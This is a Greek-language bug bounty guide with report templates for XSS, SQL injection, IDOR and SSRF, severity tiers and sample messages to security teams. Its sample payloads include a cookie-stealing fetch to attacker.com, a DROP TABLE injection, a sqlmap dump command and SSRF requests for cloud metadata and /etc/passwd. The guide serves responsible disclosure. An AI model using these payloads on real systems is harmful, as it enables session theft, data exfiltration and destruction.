## Πριν ξεκινήσετε

Μια αναφορά **Bug Bounty** βοηθά την ομάδα ασφάλειας να επαναλάβει και να αξιολογήσει μια ευπάθεια. Χρειάζεται συγκεκριμένο **endpoint** (σημείο πρόσβασης της εφαρμογής), προϋποθέσεις, βήματα αναπαραγωγής, πραγματική επίπτωση και **PoC (Proof of Concept)**. Το **payload** είναι τα δεδομένα δοκιμής που στέλνετε στην εφαρμογή. Το **triage** είναι η αρχική εξέταση και αξιολόγηση της αναφοράς.

Συμπληρώστε τα πεδία σε αγκύλες και αντικαταστήστε τα ενδεικτικά δεδομένα με όσα επιβεβαιώσατε. Τα παραδείγματα XSS, SQL Injection, IDOR και SSRF είναι εκπαιδευτικά και δεν αποδεικνύουν ότι αυτές οι αδυναμίες υπάρχουν στα αναγραφόμενα URL. Τα **PII** είναι προσωπικά δεδομένα, το **RCE** απομακρυσμένη εκτέλεση κώδικα και το **CSRF** εξαναγκασμός αποστολής ανεπιθύμητου αιτήματος από τον browser του χρήστη.

Η σοβαρότητα και οι προτεραιότητες P1–P4 του υποδείγματος είναι ενδεικτικές. Ακολουθήστε την πολιτική και το πεδίο ελέγχου του συγκεκριμένου προγράμματος. Δεν υπάρχει καθολική αντιστοίχιση «τύπος ευπάθειας = συγκεκριμένη αμοιβή ή σοβαρότητα». Δείτε τις οδηγίες για [ποιοτικές αναφορές HackerOne](https://docs.hackerone.com/en/articles/8475116-quality-reports) και την [κλίμακα προτεραιοτήτων Bugcrowd](https://docs.bugcrowd.com/researchers/receiving-rewards/getting-rewarded/).

Η ελληνική έκδοση εξυπηρετεί τη μάθηση και τη σύνταξη προσχεδίου. Για πραγματική υποβολή χρησιμοποιήστε τη γλώσσα και τα πεδία που ζητά το πρόγραμμα. Τα tokens, cookies και προσωπικά δεδομένα στα αποδεικτικά στοιχεία χρειάζονται κατάλληλη απόκρυψη. Οι εντολές και τα τεχνικά παραδείγματα διατηρούνται από το πρωτότυπο.

## 🔥 Πρότυπα ανά τύπο ευπάθειας

Χρησιμοποιήστε μόνο το πρότυπο που αντιστοιχεί στο επιβεβαιωμένο εύρημα. Οι λίστες επιπτώσεων δεν είναι αυτόματα αληθείς για κάθε περίπτωση: για παράδειγμα, ένα XSS δεν συνεπάγεται πάντα αναγνώσιμο cookie ή κατάληψη λογαριασμού. Η λίστα SSRF περιγράφει διαφορετικά πρωτόκολλα και στόχους, που δεν υποστηρίζονται αναγκαστικά από την ίδια εφαρμογή.


### XSS — εκτέλεση κώδικα στον browser (Cross-Site Scripting)

````markdown
## Σύνοψη
Ευπάθεια ανακλώμενου/αποθηκευμένου XSS στο [endpoint] επιτρέπει εκτέλεση
αυθαίρετου JavaScript στους browsers των επηρεαζόμενων χρηστών.

## Δεδομένα δοκιμής (Payload)
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## Επίπτωση
- Κατάληψη συνεδρίας μέσω κλοπής cookie
- Κατάληψη λογαριασμού
- Καταγραφή πληκτρολογήσεων
- Επιθέσεις phishing
- Διανομή κακόβουλου λογισμικού

## Αναπαραγωγή (PoC)
```javascript
// Παράδειγμα υποκλοπής προσβάσιμου cookie
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```
````

### Έγχυση SQL (SQL Injection)

````markdown
## Σύνοψη
SQL Injection στην [παράμετρο] του [endpoint] επιτρέπει εξαγωγή περιεχομένου της βάσης.

## Δεδομένα δοκιμής (Payload)
```sql
' OR '1'='1'--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--
```

## Αποδεικτικά στοιχεία
- Βάση δεδομένων: MySQL 8.0
- Πίνακες που εξήχθησαν: users, orders, payments
- Προσβάσιμες εγγραφές: 10,000+

## Εντολή SQLMap
```bash
sqlmap -u "https://example.com/page?id=1" --dbs --batch
```
````

### IDOR — μη ασφαλής άμεση αναφορά σε αντικείμενα

````markdown
## Σύνοψη
Ευπάθεια IDOR στο [endpoint] επιτρέπει πρόσβαση σε [πόρο] άλλων χρηστών.

## Αναπαραγωγή
1. Συνδεθείτε ως χρήστης Α (ID: 100)
2. Στείλτε αίτημα: `GET /api/users/100/profile`
3. Αλλάξτε το ID σε 101: `GET /api/users/101/profile`
4. Παρατηρήστε ότι επιστρέφονται δεδομένα του χρήστη Β

## Επίπτωση
- Έκθεση προσωπικών δεδομένων (όνομα, email, διεύθυνση)
- Δυνατότητα πρόσβασης σε δεδομένα [X] χρηστών
- Πιθανό ζήτημα προστασίας προσωπικών δεδομένων ή GDPR

## Αποδεικτικά στοιχεία
| Αίτημα | Απόκριση |
|---------|----------|
| `/api/users/100` | Δεδομένα χρήστη Α ✓ |
| `/api/users/101` | Δεδομένα χρήστη Β ✗ |
| `/api/users/102` | Δεδομένα χρήστη Γ ✗ |
````

### SSRF — εξαναγκασμός του server να στείλει αιτήματα

````markdown
## Σύνοψη
SSRF στη [λειτουργία] επιτρέπει αποστολή αιτημάτων προς εσωτερικές υπηρεσίες.

## Δεδομένα δοκιμής (Payload)
```
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://example.com/fetch?url=http://localhost:6379/
https://example.com/fetch?url=file:///etc/passwd
```

## Εσωτερικοί πόροι στους οποίους αποκτήθηκε πρόσβαση
- Endpoint μεταδεδομένων AWS
- Εσωτερικός διακομιστής Redis
- Τοπικό σύστημα αρχείων

## Αποδεικτικά στοιχεία
```
HTTP/1.1 200 OK

ami-id: ami-12345678
instance-id: i-1234567890abcdef0
```
````

## 📊 Ενδεικτικές κατευθύνσεις σοβαρότητας

Η προτεραιότητα εξαρτάται από τη συγκεκριμένη επίπτωση, τις προϋποθέσεις και την πολιτική του προγράμματος. Οι παρακάτω λίστες δεν είναι αυτόματοι κανόνες ταξινόμησης.


### Κρίσιμη (P1)
```
- Απομακρυσμένη εκτέλεση κώδικα (RCE)
- SQL Injection με εξαγωγή δεδομένων
- Παράκαμψη ταυτοποίησης με πρόσβαση διαχειριστή
- Πλήρης κατάληψη λογαριασμού
- Παραποίηση πληρωμών ή οικονομικών συναλλαγών
- Έκθεση προσωπικών δεδομένων όλων των χρηστών
```

### Υψηλή (P2)
```
- Αποθηκευμένο XSS με σημαντική επίπτωση
- IDOR με πρόσβαση σε ευαίσθητα δεδομένα
- SSRF προς εσωτερικές υπηρεσίες
- Ανύψωση δικαιωμάτων
- Έκθεση ευαίσθητων δεδομένων
```

### Μέτρια (P3)
```
- Ανακλώμενο XSS
- CSRF σε ευαίσθητες ενέργειες
- Αποκάλυψη πληροφοριών
- Παράκαμψη περιορισμού συχνότητας αιτημάτων
- Επιβολή προκαθορισμένης συνεδρίας (Session Fixation)
```

### Χαμηλή (P4)
```
- XSS που προϋποθέτει ενέργεια του ίδιου του χρήστη (Self-XSS)
- IDOR σε μη ευαίσθητους πόρους
- Απουσία HTTP headers ασφάλειας
- Μηνύματα σφάλματος με υπερβολικές πληροφορίες
- Δυνατότητα εξακρίβωσης υπαρκτών ονομάτων χρήστη
```

### Αρχική αναφορά
```
Γεια σας [Ομάδα ασφάλειας],

Εντόπισα ευπάθεια [τύπος ευπάθειας], με σοβαρότητα [σοβαρότητα], στο
[προϊόν/λειτουργία]. Οι αναλυτικές πληροφορίες περιλαμβάνονται στην αναφορά μου.

Σύνοψη: [Μία πρόταση]
Επίπτωση: [Σύντομη περιγραφή επίπτωσης]
PoC: [Επισυνάπτεται/Περιλαμβάνεται]

Παραμένω διαθέσιμος για πρόσθετες πληροφορίες.

Με εκτίμηση,
[Το όνομά σας]
[Προφίλ HackerOne/Bugcrowd]
```

### Ερώτημα για την πορεία της αναφοράς
```
Γεια σας,

Επικοινωνώ για την αναφορά #[ID] που υποβλήθηκε στις [ημερομηνία].
Μπορείτε να με ενημερώσετε για την πορεία της;

Ευχαριστώ.
```

### Συζήτηση για την αμοιβή
```
Ευχαριστώ για την αξιολόγηση της αναφοράς. Θεωρώ ότι η σοβαρότητα χρειάζεται
[υψηλότερη/διαφορετική] βαθμολόγηση για τους εξής λόγους:

1. [Αιτιολόγηση 1]
2. [Αιτιολόγηση 2]

Θα μπορούσατε να επανεξετάσετε το ποσό της αμοιβής με βάση αυτά τα στοιχεία;
```
